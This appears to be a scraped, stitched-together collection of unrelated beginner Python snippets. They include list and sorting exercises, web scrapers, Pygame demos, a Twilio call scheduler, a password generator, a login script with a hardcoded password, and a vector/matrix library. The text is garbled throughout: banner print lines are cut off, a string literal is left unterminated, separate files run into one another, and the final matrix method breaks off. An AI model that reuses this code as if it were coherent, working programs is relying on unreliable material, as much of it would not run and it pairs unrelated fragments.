   link : https://timesofindia.indiatimes.com/india/
2. India's Today,
   link : https://www.indiatoday.in/topic/
List.append(1)
print(List)
List.append(2)
print(List)
List.insert(1 , 3)
print(List)
        Args: 
            tlist: target list to sort
            k: max value assume known before hand
            n: the length of the given list
            map info to index of the count list.
        Adv:
            The count (after cum sum) will hold the actual position of the element in sorted order
            Using the above, 
        input: two integer values
               lower limit 'start' and maximum 'end'
               the arguments aren't inclusive.
        output: if reading successful then returns the read integer. 
        purpose: reads from command-line a integer in the given bounds. 
                 while input invalid asks user again
Scrapper for downloading prison break
series from an open server and putting them in a designated folder.
2 x 1 = 2
2 x 2 = 4
2 x 3 = 6
2 x 4 = 8
2 x 5 = 10
2 x 6 = 12
2 x 7 = 14
2 x 8 = 16
2 x 9 = 18
2 x 10 = 20
    The Knuth-Morris-Pratt Algorithm for finding a pattern within a piece of te$
    with complexity O(n + m)
    1) Preprocess pattern to identify any suffixes that are identical to prefix$
        This tells us where to continue from if we get a mismatch between a cha$
        and the text.
    2) Step through the text one character at a time and compare it to a charac$
        updating our location within the pattern if necessary
Created on Mon Feb 26 15:40:07 2018
This file contains the test-suite for the linear algebra library.
            test for method component
            test for toString() method
            test for size()-method
            test for the eulidean length
            test for + operator
            test for - operator
            test for * operator
            test for the global function zeroVector(...)
            test for the global function unitBasisVector(...)
            test for the global function axpy(...) (operation)
            test for the copy()-method
            test for the changeComponent(...)-method
	>>> binaryToDecimal(111110000)
	496
	>>> binaryToDecimal(10100)
	20
	>>> binaryToDecimal(101011)
	43
developed by: markmelnic
original repo: https://github.com/markmelnic/Scoring-Algorithm
         pypi: https://pypi.org/project/scalg/
Analyse data using a range based percentual proximity algorithm
and calculate the linear maximum likelihood estimation.
The basic principle is that all values supplied will be broken
down to a range from 0 to 1 and each column's score will be added
up to get the total score.
==========
Example for data of vehicles
price|mileage|registration_year
20k  |60k    |2012
22k  |50k    |2011
23k  |90k    |2015
16k  |210k   |2010
We want the vehicle with the lowest price,
lowest mileage but newest registration year.
Thus the weights for each column are as follows:
[0, 0, 1]
>>> score([[20, 60, 2012],[23, 90, 2015],[22, 50, 2011]], [0, 0, 1])
[[20, 60, 2012, 2.0], [23, 90, 2015, 1.0], [22, 50, 2011, 1.3333333333333335]]
>>> score([[20, 60, 2012],[23, 90, 2015],[22, 50, 2011]], [0, 0, 1], 'scores')
[2.0, 1.0, 1.3333333333333335]
>>> score_columns([[20, 60, 2012],[23, 90, 2015],[22, 50, 2011]], [0, 2], [0, 0, 1])
[[20, 2012, 1.25], [23, 2015, 1.0], [22, 2011, 0.33333333333333337]]
    algorithm and calculate the linear maximum likelihood estimation.
    Args:
        source_data (list): Data set to process.
        weights (list): Weights corresponding to each column from the data set.
            0 if lower values have higher weight in the data set,
            1 if higher values have higher weight in the data set
    Optional args:
        "score_lists" (str): Returns a list with lists of each column scores.
        "scores" (str): Returns only the final scores.
    Raises:
        ValueError: Weights can only be either 0 or 1 (int)
    Returns:
        list: Source data with the score of the set appended at as the last element.
    algorithm and calculate the linear maximum likelihood estimation.
    Args:
        source_data (list): Data set to process.
        columns (list): Indexes of the source_data columns to be scored.
        weights (list): Weights corresponding to each column from the data set.
            0 if lower values have higher weight in the data set,
            1 if higher values have higher weight in the data set
    Raises:
        ValueError: Weights can only be either 0 or 1 (int)
    Returns:
        list: Source data with the score of the set appended at as the last element.
def four_digit_combinations():
    numbers = [str(i).zfill(4) for i in range(10000)]
    print(numbers)
import csv
from datetime import datetime
import requests
from bs4 import BeautifulSoup
city = input('Enter City')
url = 'https://www.wunderground.com/weather/in/' + city
try:
    response = requests.get(url)
except requests.exceptions.RequestException as e:
    exit(1)
try:
    response.raise_for_status()
except Exception as e:
    exit(1)
html = response.text
soup = BeautifulSoup(html, 'lxml')
out2 = soup.find(class_="small-12 medium-4 large-3 columns forecast-wrap")
out3 = out2.find(class_="columns small-12")
out4 = soup.find(class_="data-module additional-conditions")
Time = datetime.now().strftime("%H:%M")
Date = out2.find('span', attrs={'class': 'date'}).get_text()
Temperature = out2.find('span', attrs={'class': 'temp'}).get_text()
Temperature = " ".join(Temperature.split())
Precipitation = 'Precipitate:' + out3.find('a', attrs={'class': 'hook'}).get_text().split(' ', 1)[0]
other = out3.find('a', attrs={'class': 'module-link'}).get_text().split('.')
sky = other[0]
Wind = other[2].strip()
with open('weather.csv', 'a') as new_file:
    csv_writer = csv.writer(new_file)
    csv_writer.writerow([city,
                         Time,
                         Date,
                         Temperature,
                         Precipitation,
                         sky, Wind])
import numpy as np
def gradient_descent(x,y):
    m_curr = b_curr = 0
    iterations = 10000
    n = len(x)
    learning_rate = 0.08
    for i in range(iterations):
        y_predicted = m_curr * x + b_curr
        cost = (1/n) * sum([val**2 for val in (y-y_predicted)])
        md = -(2/n)*sum(x*(y-y_predicted))
        bd = -(2/n)*sum(y-y_predicted)
        m_curr = m_curr - learning_rate * md
        b_curr = b_curr - learning_rate * bd
        print ("m {}, b {}, cost {} iteration {}".format(m_curr,b_curr,cost, i))
x = np.array([1,2,3,4,5])
y = np.array([5,7,9,11,13])
gradient_descent(x,y)
num = int(input("Enter a number: "))
sum = 0
temp = num
while temp > 0:
   digit = temp % 10
   sum += digit ** 3
   temp //= 10
if num == sum:
   print(num,"is an Armstrong number")
else:
   print(num,"is not an Armstrong number")
import psutil
from obs import watcher
browsers=["chrome.exe","firefox.exe","edge.exe","iexplore.exe"]
path_to_watch=r" "
for browser in browsers:
        while browser in (process.name() for process in psutil.process_iter()):
                watcher(path_to_watch)
import urllib.request
import mechanize
from bs4 import BeautifulSoup
browser = mechanize.Browser()
browser.set_handle_robots(False)
browser.addheaders = [('User-agent',
                       'Mozilla/4.0 (compatible; MSIE 5.0; Windows 98;)')]
movie_title = input("Enter movie title: ")
movie_types = ('feature', 'tv_movie', 'tv_series', 'tv_episode', 'tv_special',
               'tv_miniseries', 'documentary', 'video_game', 'short', 'video', 'tv_short')
browser.open('http://www.imdb.com/search/title')
browser.select_form(nr=1)
browser['title'] = movie_title
for m_type in movie_types:
    browser.find_control(type='checkbox', nr=0).get(m_type).selected = True
fd = browser.submit()
soup = BeautifulSoup(fd.read(), 'html5lib')
for div in soup.findAll('h3', {'class': 'lister-item-header'}, limit=1):
    a = div.findAll('a')[0]
    hht = 'http://www.imdb.com' + a.attrs['href']
    print(hht)
    page = urllib.request.urlopen(hht)
    soup2 = BeautifulSoup(page.read(), 'html.parser')
    find = soup2.find
    print("Title: " + find(itemprop='name').get_text().strip())
    print("Duration: " + find(itemprop='duration').get_text().strip())
    print("Director: " + find(itemprop='director').get_text().strip())
    print("Genre: " + find(itemprop='genre').get_text().strip())
    print("IMDB rating: " + find(itemprop='ratingValue').get_text().strip())
    print("Summary: " + find(itemprop='description').get_text().strip())
import pygame
class FloodFill:
    def __init__(self, window_width, window_height):
        self.window_width = int(window_width)
        self.window_height = int(window_height)
        pygame.init()
        pygame.display.set_caption("Floodfill")
        self.display = pygame.display.set_mode((self.window_width, self.window_height))
        self.surface = pygame.Surface(self.display.get_size())
        self.surface.fill((0, 0, 0))
        self.generateClosedPolygons()  
        self.queue = []
    def generateClosedPolygons(self):
        if self.window_height < 128 or self.window_width < 128:
            return  
        from random import randint, uniform
        from math import pi, sin, cos
        for n in range(0, randint(0, 5)):
            x = randint(50, self.window_width - 50)
            y = randint(50, self.window_height - 50)
            angle = 0
            angle += uniform(0, 0.7)
            vertices = []
            for i in range(0, randint(3, 7)):
                dist = randint(10, 50)
                vertices.append(
                    (int(x + cos(angle) * dist), int(y + sin(angle) * dist))
                )
                angle += uniform(0, pi / 2)
            for i in range(0, len(vertices) - 1):
                pygame.draw.line(
                    self.surface, (255, 0, 0), vertices[i], vertices[i + 1]
                )
            pygame.draw.line(
                self.surface, (255, 0, 0), vertices[len(vertices) - 1], vertices[0]
            )
    def run(self):
        looping = True
        while looping:
            evsforturn = []
            for ev in pygame.event.get():
                if ev.type == pygame.QUIT:
                    looping = False
                else:
                    evsforturn.append(ev)  
            self.update(evsforturn)
            self.display.blit(self.surface, (0, 0))
            pygame.display.flip()
        pygame.quit()
    def update(self, events):
        for ev in events:
            if ev.type == pygame.MOUSEBUTTONDOWN and ev.button == 1:
                self.queue.append(ev.pos)
        if not len(self.queue):
            return
        point = self.queue.pop(0)
        pixArr = pygame.PixelArray(self.surface)
        if pixArr[point[0], point[1]] == self.surface.map_rgb((255, 255, 255)):
            return
        pixArr[point[0], point[1]] = (255, 255, 255)
        left = (point[0] - 1, point[1])
        right = (point[0] + 1, point[1])
        top = (point[0], point[1] + 1)
        bottom = (point[0], point[1] - 1)
        if (
            self.inBounds(left)
            and left not in self.queue
            and pixArr[left[0], left[1]] == self.surface.map_rgb((0, 0, 0))
        ):
            self.queue.append(left)
        if (
            self.inBounds(right)
            and right not in self.queue
            and pixArr[right[0], right[1]] == self.surface.map_rgb((0, 0, 0))
        ):
            self.queue.append(right)
        if (
            self.inBounds(top)
            and top not in self.queue
            and pixArr[top[0], top[1]] == self.surface.map_rgb((0, 0, 0))
        ):
            self.queue.append(top)
        if (
            self.inBounds(bottom)
            and bottom not in self.queue
            and pixArr[bottom[0], bottom[1]] == self.surface.map_rgb((0, 0, 0))
        ):
            self.queue.append(bottom)
        del pixArr
    def inBounds(self, coord):
        if coord[0] < 0 or coord[0] >= self.window_width:
            return False
        elif coord[1] < 0 or coord[1] >= self.window_height:
            return False
        return True
if __name__ == "__main__":
    import sys
    floodfill = FloodFill(sys.argv[1], sys.argv[2])
    floodfill.run()
set1 = {1, 2, 3, 4, 5}
set2 = {4, 5, 6, 7, 8}
print("Original sets:")
print(set1)
print(set2)
print("Difference of set1 and set2 using difference():")
print(set1.difference(set2))
print("Difference of set2 and set1 using difference():")
print(set2.difference(set1))
print("Difference of set1 and set2 using - operator:")
print(set1 - set2)
print("Difference of set2 and set1 using - operator:")
print(set2 - set1)
import pygame as pg
from .statics import *
from .pieces import *
class checker_board:
    def __init__(self):
        self.board = []
        self.selected = None
        self.black_l = self.white_l = 12
        self.black_k = self.white_k = 0
        self.create_board()
    def draw_cubes(self, window):
        window.fill(green)
        for row in range(rows):
            for col in range(row % 2, cols, 2):
                pg.draw.rect(window, yellow, (row * sq_size, col * sq_size, sq_size, sq_size))
    def move (self, piece, row, col):
        self.board[piece.row][piece.col], self.board[row][col] = self.board[row][col], self.board[piece.row][piece.col]
        piece.move(row, col)
        if (row == rows - 1 or row == 0):
            piece.make_king()
            if (piece.color == white):
                self.white_k += 1
            else:
                self.black_k += 1
    def get_piece (self, row, col):
        return self.board[row][col]
    def create_board(self):
        for row in range(rows):
            self.board.append([])
            for col in range(cols):
                if ( col % 2 == ((row + 1) % 2) ):
                    if (row < 3):
                        self.board[row].append(pieces(row, col, white))
                    elif (row > 4):
                        self.board[row].append(pieces(row, col, black))
                    else:
                        self.board[row].append(0)
                else:
                    self.board[row].append(0)
    def draw (self, window):
        self.draw_cubes(window)
        for row in range(rows):
            for col in range(cols):
                piece = self.board[row][col]
                if (piece != 0):
                    piece.draw(window)
    def get_valid_moves(self, piece):
        moves = {}
        l = piece.col - 1
        r = piece.col + 1
        row = piece.row
        if (piece.color == black or piece.king):
            moves.update(self._traverse_l(row - 1, max(row - 3, -1), -1, piece.color, l))
            moves.update(self._traverse_r(row - 1, max(row - 3, -1), -1, piece.color, r))
        if (piece.color == white or piece.king):
            moves.update(self._traverse_l(row + 1, min(row + 3, rows), 1, piece.color, l))
            moves.update(self._traverse_r(row + 1, min(row + 3, rows), 1, piece.color, r))
        return moves
    def remove (self, pieces):
        for piece in pieces:
            self.board[piece.row][piece.col] = 0
            if (piece != 0):
                if (piece.color == black):
                    self.black_l -= 1
                else:
                    self.white_l -= 1
    def winner (self):
        if (self.black_l <= 0):
            return white
        elif (self.white_l <= 0):
            return black
        return None
    def _traverse_l (self, start, stop, step, color, l, skip = []):
        moves = {}
        last = []
        for r in range(start, stop, step):
            if (l < 0):
                break
            current = self.board[r][l]
            if (current == 0):
                if (skip and not last):
                    break
                elif (skip):
                    moves[(r, l)] = last + skip
                else:
                    moves[(r, l)] = last
                if (last):
                    if (step == -1):
                        row = max(r - 3, 0)
                    else:
                        row = min(r + 3, rows)
                    moves.update(self._traverse_l(r + step, row, step, color, l - 1, skip = last))
                    moves.update(self._traverse_r(r + step, row, step, color, l + 1, skip = last))
                break
            elif (current.color == color):
                break
            else:
                last = [current]
            l -= 1
        return moves
    def _traverse_r (self, start, stop, step, color, right, skip = []):
        moves = {}
        last = []
        for r in range(start, stop, step):
            if (right >= cols):
                break
            current = self.board[r][right]
            if (current == 0):
                if (skip and not last):
                    break
                elif (skip):
                    moves[(r, right)] = last + skip
                else:
                    moves[(r, right)] = last
                if (last):
                    if (step == -1):
                        row = max(r - 3, 0)
                    else:
                        row = min(r + 3, rows)
                    moves.update(self._traverse_l(r + step, row, step, color, right - 1, skip = last))
                    moves.update(self._traverse_r(r + step, row, step, color, right + 1, skip = last))
                break
            elif (current.color == color):
                break
            else:
                last = [current]
            right += 1
        return moves
N = int(input("Enter The number")) 
count = len(str(N))
print(count)        
from settings import key
import requests
import os
date = input("Enter date(YYYY-MM-DD): ")
r = requests.get(f"https://api.nasa.gov/planetary/apod?api_key={key}&date={date}")
parsed = r.json()
title = parsed['title']
url = parsed['hdurl']
print(f"{title}: {url}")
img_ = requests.get(url, stream=True)
print(img_.headers)
print(img_.headers["content-type"], img_.headers["content-length"])
content_type = img_.headers["content-type"]
if (img_.status_code == 200 and (content_type == "image/jpeg" or content_type == "image/gif" or content_type == "image/png")):
	ext = img_.headers["content-type"][6:]
	if (not os.path.exists ("img/")):
		os.mkdir("img/")
	path = f"img/apod_{date}.{ext}"
	with open(path, "wb") as f:
		for chunk in img_:
			f.write(chunk)
import re 
import calendar  
import datetime 
def process_date(user_input):
    user_input=re.sub(r"/", " ", user_input) 
    user_input=re.sub(r"-", " ", user_input) 
    return user_input
def find_day(date):
    born = datetime.datetime.strptime(date, '%d %m %Y').weekday() 
    return (calendar.day_name[born]) 
user_input=str(input("Enter date     "))
date=process_date(user_input)
print("Day on " +user_input + "  is "+ find_day(date) )
import os
from getpass import getpass
def logo():
    print(" ──────────────────────────────────────────────────────── ")
    print(" |                                                        | ")
    print(" |   
    print(" |   
    print(" |   
    print(" |   
    print(" |   
    print(" |   
    print(" |   
    print(" |                                                        | ")
    print(" \033[1;91m|   || Digital Information Security Helper Assistant ||  | ")
    print(" |                                                        | ")
    print(" ──────────────────────────────────────────────────────── ")
    print('\033[1;36;49m')
def login():
    os.system('clear')
    print('\033[1;36;49m')
    logo()
    print('\033[1;36;49m')
    usr = input("Enter your Username : ")
    usr1 ="raj"
    psw = getpass("Enter Your Password : ")
    psw1 ="5898"
    if(usr == usr1 and psw == psw1):
        print('\033[1;92mlogin successfully')
        os.system('clear')
        print('\033[1;36;49m')
        logo()
    else:
        print('\033[1;91m Wrong')
        login()
if __name__=="__main__":
    login()
import random
responses = ['It is certain','It is decidedly so','Without a doubt','Yes definitely ','You may rely on it','As I see it, yes','Most likely ','Outlook good','Yes','Signs point to yes','Do not count on it','My reply is no',' My sources say no',' Outlook not so good','Very doubtful', 'Reply hazy try again','Ask again later','Better not tell you now ','Cannot predict now ','Concentrate and ask again']
print("Hi! I am the magic 8 ball, what's your name?")
name = input()
print("Hello!"+ name)
def magic8Ball():
    print("Whay's your question? ")
    question = input()
    answer = responses[random.randint(0,len(responses)-1)]
    print(answer)
    tryAgain()
def tryAgain():
    print("Do you wanna ask any more questions? press Y for yes and any other key to exit ")
    x = input()
    if(x in ['Y', 'y'] ):
        magic8Ball()
    else:
        exit()
magic8Ball()from fpdf import FPDF
class MyPdf(FPDF):
    def header(self):
        self.set_font('Arial', 'B', 18)
        self.text(27, 10, 'Generating PDF With python')
        self.ln(10)
    def footer(self):
        self.set_y(-10)
        self.set_font('Arial', 'I', 8)
        self.cell(0, 10, 'Page No {}'.format(self.page_no()), 0, 0, 'C')
        pass
pdf = MyPdf()
pdf.set_author('@NavonilDas')
pdf.set_subject('python')
pdf.set_title('Generating PDF with Python')
pdf.add_page()
pdf.set_font("Courier", '', 18)
pdf.text(0, 50, "Example to generate PDF in python.")
pdf.set_font("Courier", 'i', 28)
pdf.text(0, 60, "This is an italic text")  
pdf.add_page()
pdf.cell(0, 10, 'Hello There', 1, 1, 'C')
pdf.output('output.pdf', 'F')
import pickle
import re
import sys
import urllib
import pandas as pd
import requests
from bs4 import BeautifulSoup
from newspaper import Article
fakearticle_links = []
for i in range(1, 159):
    url = "https://www.boomlive.in/fake-news/" + str(i)
    try:
        page = requests.get(url)
        page = requests.get(url)
        soup = BeautifulSoup(page.text, "html.parser")
        for content in soup.find_all("h2", attrs={"class": "entry-title"}):
            link = content.find("a")
            fakearticle_links.append(link.get("href"))
    except Exception as e:
        error_type, error_obj, error_info = sys.exc_info()
        print("ERROR FOR LINK:", url)
        print(error_type, "Line:", error_info.tb_lineno)
        continue
fakearticle_links[:5]
len(fakearticle_links)
fakearticle_links[1888:]
import matplotlib.pyplot as plt
import pandas as pd
import numpy as np
str1 = "https://www.boomlive.in/fake-news"
fakearticle_links = [str1 + lnk for lnk in fakearticle_links]
fakearticle_links[6:10]
news_dataset = pd.DataFrame(fakearticle_links, columns=["URL"])
news_dataset.head()
title, text, summary, keywords, published_on, author = (
    [],
    [],
    [],
    [],
    [],
    [],
)  
for Url in fakearticle_links:
    article = Article(Url)
    try:
        article.download()
        article.parse()
        article.nlp()
    except Exception as error:
        print(f"exception : {error}")
        pass
    title.append(article.title)  
    text.append(article.text)  
    summary.append(article.summary)  
    keywords.append(", ".join(article.keywords))  
    published_on.append(article.publish_date)  
    author.append(article.authors)  
news_dataset.to_csv("Fake_news.csv")
from google.colab import files
files.download("Fake_news.csv")
   with open(filename,'rb') as img_file:
       img_file.seek(163)
       a = img_file.read(2)
       height = (a[0] << 8) + a[1]
       a = img_file.read(2)
       width = (a[0] << 8) + a[1]
   print("The resolution of the image is",width,"x",height)
jpeg_res("img1.jpg")
def quick_sort(l):
    if len(l) <= 1:
        return l
    else:
        return quick_sort([e for e in l[1:] if e <= l[0]]) + [l[0]] +\
            quick_sort([e for e in l[1:] if e > l[0]])
exp = [2200,2350,2600,2130,2190]
print("In feb this much extra was spent compared to jan:",exp[1]-exp[0]) 
print("Expense for first quarter:",exp[0]+exp[1]+exp[2]) 
print("Did I spent 2000$ in any month? ", 2000 in exp) 
exp.append(1980)
print("Expenses at the end of June:",exp) 
exp[3] = exp[3] - 200
print("Expenses after 200$ return in April:",exp) 
heros=['spider man','thor','hulk','iron man','captain america']
print(len(heros))
heros.append('black panther')
print(heros)
heros.remove('black panther')
heros.insert(3,'black panther')
print(heros)
heros[1:3]=['doctor strange']
print(heros)
heros.sort()
print(heros)
def counting_sort(array1, max_val):
    m = max_val + 1
    count = [0] * m                
    for a in array1:
        count[a] += 1             
    i = 0
    for a in range(m):            
        for c in range(count[a]):  
            array1[i] = a
            i += 1
    return array1
print(counting_sort( [1, 2, 7, 3, 2, 1, 4, 2, 3, 2, 1], 7 ))
import os
from firebase_admin import credentials, firestore, initialize_app
from datetime import datetime,timedelta
import time
from time import gmtime, strftime
import twilio
from twilio.rest import Client
acc_sid=""
auth_token=""
client=Client(acc_sid, auth_token)
cred = credentials.Certificate('key.json')
default_app = initialize_app(cred)
db = firestore.client()
database_reference = db.collection('on_call')
def search():
    calling_time = datetime.now()
    one_hours_from_now = (calling_time + timedelta(hours=1)).strftime('%H:%M:%S')  
    current_date=str(strftime("%d-%m-%Y", gmtime()))
    docs = db.collection(u'on_call').where(u'date',u'==',current_date).stream()
    list_of_docs=[]
    for doc in docs:
        c=doc.to_dict()
        if (calling_time).strftime('%H:%M:%S')<=c['from']<=one_hours_from_now:
            list_of_docs.append(c)
    print(list_of_docs)
    while(list_of_docs):
        timestamp=datetime.now().strftime('%H:%M')
        five_minutes_prior= (timestamp + timedelta(minutes=5)).strftime('%H:%M')
        for doc in list_of_docs:
            if doc['from'][0:5]==five_minutes_prior:
                phone_number= doc['phone']
                call = client.calls.create(
                to=phone_number,
                from_="add your twilio number",
                url="http://demo.twilio.com/docs/voice.xml"
                )
                list_of_docs.remove(doc)
population = {
    'china': 143,
    'india': 136,
    'usa': 32,
    'pakistan': 21
}
def add():
    country=input("Enter country name to add:")
    country=country.lower()
    if country in population:
        print("Country already exist in our dataset. Terminating")
        return
    p=input(f"Enter population for {country}")
    p=float(p)
    population[country]=p 
    print_all()
def remove():
    country = input("Enter country name to remove:")
    country = country.lower()
    if country not in population:
        print("Country doesn't exist in our dataset. Terminating")
        return
    del population[country]
    print_all()
def query():
    country = input("Enter country name to query:")
    country = country.lower()
    if country not in population:
        print("Country doesn't exist in our dataset. Terminating")
        return
    print(f"Population of {country} is: {population[country]} crore")
def print_all():
    for country, p in population.items():
        print(f"{country}==>{p}")
def main():
    op=input("Enter operation (add, remove, query or print):")
    if op.lower() == 'add':
        add()
    elif op.lower() == 'remove':
        remove()
    elif op.lower() == 'query':
        query()
    elif op.lower() == 'print':
        print_all()
if __name__ == '__main__':
    main()import random
lChars = 'abcdefghijklmnopqrstuvwxyz'
uChars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
digits = '1234567890'
specialChars = '!@
passLen = 10  
myPass = ''
for i in range(passLen):
    while (len(myPass)) <= 2:
        index = random.randrange(len(lChars))
        myPass = myPass + lChars[index]
        myPassLen = len(myPass)
    while (len(myPass)) <= 5:
        index = random.randrange(len(digits))
        myPass = myPass + digits[index]
        myPassLen = len(myPass)
    while (len(myPass)) <= 7:
        index = random.randrange(len(specialChars))
        myPass = myPass + specialChars[index]
        myPassLen = len(myPass)
    while (len(myPass)) <= 10:
        index = random.randrange(len(uChars))
        myPass = myPass + uChars[index]
        myPassLen = len(myPass)
print(myPass)
import math
def factorial(n):
    if n == 0:
        return 1
    else:
        return n * factorial(n - 1)
n = int(input("Input a number to compute the factiorial : "))
print(factorial(n))
if n>=0 :
    print(math.factorial(n))
else:
    print("Value of n is inValid!")
print("\nExercise 1\n")
result = ["heads","tails","tails","heads","tails","heads","heads","tails","tails","tails"]
count = 0
for item in result:
    if item == "heads":
        count += 1
print("Heads count: ",count)
print("\nExercise 2\n")
for i in range(1,11):
    if i % 2 == 0:
        continue
    print(i*i)
print("\nExercise 3\n")
month_list = ["January", "February", "March", "April", "May"]
expense_list = [2340, 2500, 2100, 3100, 2980]
e = input("Enter expense amount: ")
e = int(e)
month = -1
for i in range(len(expense_list)):
    if e == expense_list[i]:
        month = i
        break
if month != -1:
    print(f'You spent {e} in {month_list[month]}')
else:
    print(f'You didn\'t spend {e} in any month')
print("\nExercise 4\n")
for i in range(5):
    print(f"You ran {i+1} miles") 
    tired = input("Are you tired? ")
    if tired == 'yes':
        break
if i == 4: 
    print("Hurray! You are a rock star! You just finished 5 km race!")
else:
    print("You didn't finish 5 km race but hey congrats anyways! You still ran {i+1} miles")
print("\nExercise 5\n")
for i in range(1,6):
    s = ''
    for j in range(i):
        s += '*'
    print(s)
import os
import shutil
class RearrangeFile(object):
    def __init__(self):
        self.folder_path = os.getcwd()
        self.list_of_all_files = os.listdir(self.folder_path)
    def make_folder_and_return_name(self, foldername):
        if os.path.exists(foldername) is False:
            os.mkdir(foldername)
        else:
            foldername = foldername + str(2)
            os.mkdir(foldername)
        return foldername
    def check_folder_existance(self):
        for i in range(len(self.list_of_all_files)):
            if self.list_of_all_files[i].endswith('.pdf'):
                if os.path.exists('pdfs'):
                    shutil.move(self.folder_path + '/' + self.list_of_all_files[i], self.folder_path + '/pdfs')
                else:
                    os.mkdir('pdfs')
            elif self.list_of_all_files[i].endswith('jpg'):
                if os.path.exists('jpgs'):
                    shutil.move(self.folder_path + '/' + self.list_of_all_files[i], self.folder_path + '/jpgs')
                else:
                    os.mkdir('jpgs')
if __name__ == "__main__":
    re = RearrangeFile()
    re.check_folder_existance()
india = ["mumbai", "banglore", "chennai", "delhi"]
pakistan = ["lahore", "karachi", "islamabad"]
bangladesh = ["dhaka", "khulna", "rangpur"]
city1 = input("Enter city 1: ")
city2 = input("Enter city 2: ")
if city1 in india and city2 in india:
    print("Both cities are in india")
elif city1 in pakistan and city2 in pakistan:
    print("Both cities are in pakistan")
elif city1 in bangladesh and city2 in bangladesh:
    print("Both cities are in bangladesh")
else:
    print("They don't belong to same country")
from . import ball, paddle, rectangle
from typing import Tuple
def load_balls(win_size : Tuple, radius : float, speed : Tuple, batch=None):
    balls = []
    ball_x = win_size[0]/2
    ball_y = win_size[1]/2
    new_ball = ball.BallObject(x=ball_x, y=ball_y, radius=radius, batch=batch)
    new_ball.velocity_x, new_ball.velocity_y = speed[0], speed[1]
    balls.append(new_ball)
    return balls
def load_paddles(paddle_pos : Tuple, width : float, height : float, acc : Tuple, batch=None):
    paddles = []
    new_paddle = paddle.Paddle(x=paddle_pos[0], y=paddle_pos[1], width=width, height=height, batch=batch)
    new_paddle.rightx = new_paddle.x + width
    new_paddle.acc_left, new_paddle.acc_right = acc[0], acc[1]
    paddles.append(new_paddle)
    return paddles
def load_rectangles(win_size : Tuple, border : float, batch=None):
    rectangles = []
    top = rectangle.RectangleObject(x=0, y=win_size[1]-border, width=win_size[0], height=border, batch=batch)
    left = rectangle.RectangleObject(x=0, y=0, width=border, height=win_size[1], batch=batch)
    right = rectangle.RectangleObject(x=win_size[0] - border, y=0, width=border, height=win_size[1], batch=batch)
    rectangles.extend([left, top, right])
    return rectangles
import math
import random
class Vector(object):
    def __init__(self, components):
        self.__components = components
    def set(self, components):
        if len(components) > 0:
            self.__components = components
        else:
            raise Exception("please give any vector")
    def __str__(self):
        ans = "("
        length = len(self.__components)
        for i in range(length):
            if i != length - 1:
                ans += str(self.__components[i]) + ","
            else:
                ans += str(self.__components[i]) + ")"
        if len(ans) == 1:
            ans += ")"
        return ans
    def component(self, i):
        if i < len(self.__components) and i >= 0:
            return self.__components[i]
        else:
            raise Exception("index out of range")
    def size(self):
        return len(self.__components)
    def eulidLength(self):
        summe = 0
        for c in self.__components:
            summe += c ** 2
        return math.sqrt(summe)
    def __add__(self, other):
        size = self.size()
        result = []
        if size == other.size():
            for i in range(size):
                result.append(self.__components[i] + other.component(i))
        else:
            raise Exception("must have the same size")
        return Vector(result)
    def __sub__(self, other):
        size = self.size()
        result = []
        if size == other.size():
            for i in range(size):
                result.append(self.__components[i] - other.component(i))
        else:  
            raise Exception("must have the same size")
        return Vector(result)
    def __mul__(self, other):
        ans = []
        if isinstance(other, float) or isinstance(other, int):
            for c in self.__components:
                ans.append(c * other)
        elif (isinstance(other, Vector) and (self.size() == other.size())):
            size = self.size()
            summe = 0
            for i in range(size):
                summe += self.__components[i] * other.component(i)
            return summe
        else:  
            raise Exception("invalide operand!")
        return Vector(ans)
    def copy(self):
        components = [x for x in self.__components]
        return Vector(components)
    def changeComponent(self, pos, value):
        assert (pos >= 0 and pos < len(self.__components))
        self.__components[pos] = value
    def norm(self):
        eLength = self.eulidLength()
        quotient = 1.0 / eLength
        for i in range(len(self.__components)):
            self.__components[i] = self.__components[i] * quotient
        return self
    def __eq__(self, other):
        ans = True
        SIZE = self.size()
        if (SIZE == other.size()):
            for i in range(SIZE):
                if self.__components[i] != other.component(i):
                    ans = False
                    break
        else:
            ans = False
        return ans
def zeroVector(dimension):
    assert (isinstance(dimension, int))
    ans = []
    for i in range(dimension):
        ans.append(0)
    return Vector(ans)
def unitBasisVector(dimension, pos):
    assert (isinstance(dimension, int) and (isinstance(pos, int)))
    ans = []
    for i in range(dimension):
        if i != pos:
            ans.append(0)
        else:
            ans.append(1)
    return Vector(ans)
def axpy(scalar, x, y):
    assert (isinstance(x, Vector) and (isinstance(y, Vector)) \
            and (isinstance(scalar, int) or isinstance(scalar, float)))
    return (x * scalar + y)
def randomVector(N, a, b):
    ans = zeroVector(N)
    random.seed(None)
    for i in range(N):
        ans.changeComponent(i, random.randint(a, b))
    return ans
class Matrix(object):
    def __init__(self, matrix, w, h):
        self.__matrix = matrix
        self.__width = w
        self.__height = h
    def __str__(self):
        ans = ""
        for i in range(self.__height):
            ans += "|"
            for j in range(self.__width):
                if j < self.__width - 1:
                    ans += str(self.__matrix[i][j]) + ","
                else:
                    ans += str(self.__matrix[i][j]) + "|\n"
        return ans
    def changeComponent(self, x, y, value):
        if x >= 0 and x < self.__height and y >= 0 and y < self.__width:
            self.__matrix[x][y] = value
        else:
            raise Exception("changeComponent: indices out of bounds")
    def component(self, x, y):
        if x >= 0 and x < self.__height and y >= 0 and y < self.__width:
            return self.__matrix[x][y]
        else:
            raise Exception("changeComponent: indices out of bounds")
    def width(self):
        return self.__width
    def height(self):
        return self.__height
    def __mul__(self, other):
        if isinstance(other, Vector):  
            if (other.size() == self.__width):
                ans = zeroVector(self.__height)
                for i in range(self.__height):
                    summe = 0
                    for j in range(self.__width):
                        summe += other.component(j) * self.__matrix[i][j]
                    ans.changeComponent(i, summe)
                    summe = 0
                return ans
            else:
                raise Exception("vector must have the same size as the "
                                + "number of columns of the matrix!")
        elif isinstance(other, int) or isinstance(other, float):  
            matrix = []
            for i in range(self.__height):
                row = []
                for j in range(self.__width):
                    row.append(self.__matrix[i][j] * other)
                matrix.append(row)
            return Matrix(matrix, self.__width, self.__height)
    def __add__(self, other):
        if (self.__width == other.width() and self.__height == other.height()):
            matrix = []
            for i in range(self.__height):
                row = []
                for j in range(self.__width):
                    row.append(self.__matrix[i][j] + other.component(i, j))
                matrix.append(row)
            return Matrix(matrix, self.__width, self.__height)
        else:
            raise Exception("matrix must have the same dimension!")
    def __sub__(self, other):
        if (self.__width == other.width() and self.__height == other.height()):
            matrix = []
            for i in range(self.__height):
                row = []
                for j in range(self.__width):
                    row.append(self.__matrix[i][j] - other.component(i, j))
                matrix.append(row)
